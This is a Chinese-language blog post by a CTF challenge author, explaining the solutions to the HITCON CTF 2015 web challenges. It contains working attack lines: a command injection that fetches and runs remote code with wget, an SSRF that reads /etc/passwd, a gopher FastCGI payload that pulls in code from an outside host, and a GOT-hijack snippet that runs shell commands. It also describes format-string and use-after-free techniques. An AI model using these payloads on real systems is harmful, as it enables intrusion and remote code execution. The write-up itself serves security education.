---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2016-01-hitcon-ctf-2015-quals-final/
title: "HITCON CTF 2015 Quals & Final 心得備份 | Orange Tsai"
author: "Orange Tsai"
published: 2016-01-13T16:00:00.000Z
description: "當初好像沒留底稿只發布在 Facebook 跟烏雲，今天睡醒發現又有人在轉貼這篇，想說留個備份好了XD Facebook 連結 Wooyun 知識庫連結 HITCON KnowledgeBase 連結 決賽 Attack & Defense 也出了一道 Web 題目，0ops 成員 5alt 也寫了一篇筆記 HITCON CTF 2015 Final Webful Writeup。 寫"
---

* * *

當初好像沒留底稿只發布在 Facebook 跟烏雲，今天睡醒發現又有人在轉貼這篇，想說留個備份好了XD

- [Facebook 連結](https://www.facebook.com/notes/orange-tsai/hitcon-ctf-2015-quals-web-%E5%87%BA%E9%A1%8C%E5%BF%83%E5%BE%97/10153638014065460?notif_t=like)
- [Wooyun 知識庫連結](http://drops.wooyun.org/web/9845)
- [HITCON KnowledgeBase 連結](http://kb.hitcon.org/post/131488130087/hitcon-ctf-2015-quals-web-%E5%87%BA%E9%A1%8C%E5%BF%83%E5%BE%97)

決賽 Attack & Defense 也出了一道 Web 題目，0ops 成員 5alt 也寫了一篇筆記 [HITCON CTF 2015 Final Webful Writeup](http://5alt.me/posts/2015/12/HITCON%20CTF%202015%20Final%20Webful%20Writeup.html)。 寫的真棒XD 看得我自己心癢癢都想寫一篇來解釋各個洞為什麼要這樣設計了XD

出 Final 時候本意就是要把環境模擬成真實環境，讓平常 Web 狗的各種猥瑣流可以得心應手而不是淪為解題形式在實戰中派不上用場，除了各個 API 接口的互相影響 **單點淪陷 = 全部淪陷** 外，還有模擬 Discuz UC\_KEY 的應用，SECRET\_KEY 洩漏的各種利用方式順便防止 Replay，裡面的 VIM 備份檔下載也是隨著題目應運而生出現的洞XD

（看了你才知道真實世界中為什麼會出現這樣的洞）

最後預料之外的是，本來想說大家都是世界等級的隊伍修漏洞應該很快，所以本來預期最後大家都是去繞各個隊伍的 WAF ，不過看來有點太坑了XD

# [寫在 HITCON CTF 2015 Quals 之後](https://blog.orange.tw/posts/2016-01-hitcon-ctf-2015-quals-final/\#%E5%AF%AB%E5%9C%A8-HITCON-CTF-2015-Quals-%E4%B9%8B%E5%BE%8C "寫在 HITCON CTF 2015 Quals 之後") 寫在 HITCON CTF 2015 Quals 之後

作為出題團隊的一員，不得不說這次的難度真的不是有點高而已XD 不過就身為 DEFCON 種子賽我覺得可以說是名符其實! :)

這次負責了所有的 Web 題目，私心來說都是自信之作，把自己最近研究的一些東西出成題目XD 就參賽者反應來說，讓他們在解題時覺得很難但解出後會有「原來如此」、「還可以這樣玩」的感覺是我這次主要出題的目的XD

p.s. 相關代碼皆放在 Github 上，有興趣研究之同學可以先看看代碼嘗試解解看後在敘述!

## [1. 100 BabyFirst (33 隊解)](https://blog.orange.tw/posts/2016-01-hitcon-ctf-2015-quals-final/\#1-100-BabyFirst-33-%E9%9A%8A%E8%A7%A3 "1. 100 BabyFirst (33 隊解)") 1\. 100 BabyFirst (33 隊解)

> [https://gist.github.com/orangetw/cb3487e47d7aaaea4692](https://gist.github.com/orangetw/cb3487e47d7aaaea4692)

作為本次 Web 最簡單的題目，純代碼分析並且只有十五行程式碼而已，在比賽開始後兩小時才有人解出 。

簡單使用 `\n` 就可以繞過常見正規表示式沒有 match multiline 的問題，不過難點在於可以 Command Injection 但是指令都限制在是 `a-zA-Z0-9_` ，這也是最有趣的地方，每個隊伍的想法都不一樣所以會有很多種解法!

自己的官方解法是

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br>mkdir orange<br>cd orange<br>wget HEXED_IP<br>tar cvf payload orange<br>php payload<br>``` |

就可以任意代碼執行 ，從 log 中有看到其他隊伍的解法是

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>busybox ftpget ...  <br>``` |

或是

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>twistd telnet ...  <br>``` |

或是

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>``` | ```<br>wget HEX_IP<br>// 給個 302 Redirect 到 FTP protocol 上，也是這題解法中最訝異的XD<br>// 本來還檢查過 wget source code 想說產生的 index.html 應該不可控，結果居然到 FTP Protocol 上竟然就可以控  <br>``` |

總體來講也看到各種玩 Command Line 的極限XD 學到滿多用法的，做為出題者來講我覺得是最成功的一題，簡單好玩又有趣!

## [2. 200 nanana (18 隊解)](https://blog.orange.tw/posts/2016-01-hitcon-ctf-2015-quals-final/\#2-200-nanana-18-%E9%9A%8A%E8%A7%A3 "2. 200 nanana (18 隊解)") 2\. 200 nanana (18 隊解)

> [https://gist.github.com/orangetw/4942d949134227eedd4c](https://gist.github.com/orangetw/4942d949134227eedd4c)

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>xxd -r -p nanana.xxd > nanana<br>``` |

名為 Web 實際上卻是 Pwn 的題目，只提供 binary 並無提供 `libcgid.so` 所以必須在沒有 library 的狀況下解決這題!

簡單的 Format String 但沒有 output (sprintf)，把 do\_job 的 GOT 換成 system 的 PLT 地址就可以，不過唯一要注意的是得先利用 stack guard 覆蓋 stack smashing detected 的 `ARGV[1]` 的方式達成任意地址洩漏把 password 給洩漏出來才比較好利用，但是因為 64-bits 且送的東西無法有 NULL Byte 所以在蓋 `ARGV[1]` 的時候必須用比較迂迴的方式蓋

- 先使用 username 把 `ARGV[1]` 最後一個蓋 0
- 再使用 username 把 `ARGV[1]` 倒數第二個蓋 0
- 之後 job 蓋記憶體位置(0x601090)三個 bytes 後剩下的五個 bytes 才會剛好是 0 可以任意地址讀取

詳細 Exploit 可以參考

> [https://gist.github.com/orangetw/583a73f58d49b1a3fc14](https://gist.github.com/orangetw/583a73f58d49b1a3fc14)

## [3. 300 Giraffe’s Coffee (16 隊解)](https://blog.orange.tw/posts/2016-01-hitcon-ctf-2015-quals-final/\#3-300-Giraffe%E2%80%99s-Coffee-16-%E9%9A%8A%E8%A7%A3 "3. 300 Giraffe’s Coffee (16 隊解)") 3\. 300 Giraffe’s Coffee (16 隊解)

> [https://gist.github.com/orangetw/4a412fb0d49cad0c4ea3](https://gist.github.com/orangetw/4a412fb0d49cad0c4ea3)

也是代碼分析的題目，核心的概念是 PHP 中 PRNG 的預測。

由於電腦很難做到真正的 “隨機”，所以現在大部分隨機數的產生都基於 PRNG，在 PHP 中 PRNG 的實現是變形的 Mersenne Twister 演算法!

在沒有提供 seed 的下 php\_mt\_rand 會拿當前 pid 以及時間做一些運算當成種子，而這個 seed 是 32-bits 長的，所以是可破解的

有些人會使用現成的工具來解，但會發現失敗，無法準確的預測 PRNG 是因為當 PHP 在 Apache 下時是使用 prefork 的方式去執行，所以每次的連線都是從已經 fork 好的 process 中挑一個去給你使用，因此無法確定當前的 process PRNG 中 STATE 的狀態是否為第一次，以及每次連線上的 process 也不一定相同所以 STATE 狀態更無法預測 (現成工具只會算 seed 後的第一次來比對)

這點可以使用 Keep-Alive 的方式來確保連上的是同一個 process，之後再原本種子的破解上多加上往 STATE 的運算(共有 624 個 STATE) 應該就可以解了!

## [4. 400 lalala (2 隊解)](https://blog.orange.tw/posts/2016-01-hitcon-ctf-2015-quals-final/\#4-400-lalala-2-%E9%9A%8A%E8%A7%A3 "4. 400 lalala (2 隊解)") 4\. 400 lalala (2 隊解)

一個可以給使用者上傳圖片或是提供網址幫你抓起來上傳圖片的服務，核心概念就是透過 302 redirect 去繞過限制實現 SSRF，並且再透過 SSRF 中的 gopher 去利用本地的 FastCGI prtocol 實現遠端代碼執行!

在抓取圖片的時候可以使用 302 去做 SSRF (其實很多人在研究 SSRF 的時候都忽略的 302 的妙處)

在 SSRF 中可以讀檔:

> Location: file://localhost/etc/passwd

會發現伺服器的架構是使用 Nginx + PHP-FPM，其中 PHP-FPM fastcgi protocol 是以 bind port 的方式跑在本機上。

在真實世界中，只要發現對方的 PHP FastCGI 是可以外連的話那就可以拿 shell，所以使用 gopher 構造 FastCGI Protocol 訪問本機的 9001 port 就可以任意代碼執行 (使用 PHP\_ADMIN\_VALUE 把 allow\_url\_include 設成 on 以及新增 auto\_prepend\_file 到自己的網站)

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>Location: gopher://127.0.0.1:9001/x%01%01i%13%00%08%00%00%00%01%00%00%00%00%00%00%01%04i%13%00%8B%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/_www/index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%09%26PHP_VALUEauto_prepend_file%20%3D%20http%3A//orange.tw/x%01%04i%13%00%00%00%00%01%05i%13%00%00%00%00<br>``` |

這題比較有趣的另外一個點是，如果有實作過 SSRF 搭配 gopher 的話，應該會發現

> Java 中的 gopher 只能接受 0x00 - 0x7f
>
> libcurl 中的 gopher 只能接受 0x01 - 0xff

然後本題使用 PHP 中的 curl\_exec ，會使用到 libcurl 無法使用 NULL Byte，但是構造 FastCGI Protocol 的話非得有 NULL Byte 不可，後來去研究了一下 libcurl 的原始碼，發現是因為寫得有點問題才不能使用 NULL Byte

所以送了一個 commit 過去還被接受了…XD

> [https://github.com/bagder/curl/commit/5bf36ea30d38b9e00029180ddbab73cab94a2195](https://github.com/bagder/curl/commit/5bf36ea30d38b9e00029180ddbab73cab94a2195)

所以現在新版本的 libcurl / curl 應該 gopher 都可以使用 NULL Byte 了XD

## [5. 500 Use-After-FLEE (只有 PPP 解出)](https://blog.orange.tw/posts/2016-01-hitcon-ctf-2015-quals-final/\#5-500-Use-After-FLEE-%E5%8F%AA%E6%9C%89-PPP-%E8%A7%A3%E5%87%BA "5. 500 Use-After-FLEE (只有 PPP 解出)") 5\. 500 Use-After-FLEE (只有 PPP 解出)

身為 Web 最難題XD

許多時候，在做滲透測試時都會遇到，打進一台虛擬主機(hosting)後要去訪問同主機上的其他網站會被 `open_basedir` 以及 `disable_functions` 限制住，但 PHP 在歷史上出現過了許許多多的 Memory 上的洞，這題使用到的就是其中一個 ( 出題時 Ubuntu apt-get 預設安裝的 PHP 還是有洞，不過寫這篇文章時好像已經修了XD )

漏洞 PoC 的話可參考 80vul 的 PHP Codz Hacking，不過只有 PoC :(

> [https://github.com/80vul/phpcodz/blob/master/research/pch-034.md](https://github.com/80vul/phpcodz/blob/master/research/pch-034.md)

使用 Use-After-Free 去繞過上面限制，說的好像很簡單，不過在現今作業系統中有很多的保護你必須面對

1. DEP
2. FULL ASLR
3. PIE (Apache 預設全開)
4. FULL RELRO (Apache 預設全開)
5. 由於環境在 Apache + mod\_php 上，PHP 是以 Library 的形式被載入到 Apache 中，所以再利用難度上會增加(純 CLI 其實很容易 Exploit)，例如要自己處理 Parsing ELF 的動作XD

不過 PPP 不愧是最強隊伍在比賽結束前一個半小時解出，也是唯一一隊解出的隊伍!

不過有點小遺憾的是，因為比賽平台都在 EC2 的 Ubuntu 14.04 64-bits 上，所以對於 libc 的 offset 他們直接拿其他 Pwn 題目的 libc offset 而不是透過算 STRTAB, SYMTAB, JMPREL 來把 offset 找出 :)

其中 PPP 的 Ricky 利用 ZVAL 結構中把 `type` 置換成物件，並把 `handler` 換成 `system`

> [https://github.com/pwning/public-writeup/blob/master/hitcon2015/web500-use-after-flee/exploit.php](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web500-use-after-flee/exploit.php)

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>``` | ```<br>struct _zval_struct {<br>  zvalue_value value;<br>  zend_uint refcount__gc;<br>  zend_uchar type;<br>  zend_uchar is_ref__gc;<br>};<br>``` |

這樣 PHP 內部在處理時發現引用為 0 時會自動做 destruct 把並且把 ZVAL 當成參數丟給 handler ，這時有 8 bytes 的指令長度限制可以用(所以 Ricky 使用 `sh /*/a;` 的做法來執行指令) 。

不過如果在 32-bits 下就變成 4 bytes 的長度限制幾乎無法利用XD 比較優雅的做法可以把 GOT Hijacking 把 fopen 換成 system 之後呼叫 fopen 就可以任意指令執行，有興趣的同學可以嘗試寫寫看，並且把 Exploit 寫到完美! :P

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>``` | ```<br><?php<br>  write($open_got, $system_address);<br>  fopen("| $cmd", "r");<br>``` |

寫到這裡，在 Web Security 的領域上有太多太多的 tricks 以及問題等待著我們去解決

身為一個 Web 狗，我很驕傲 :)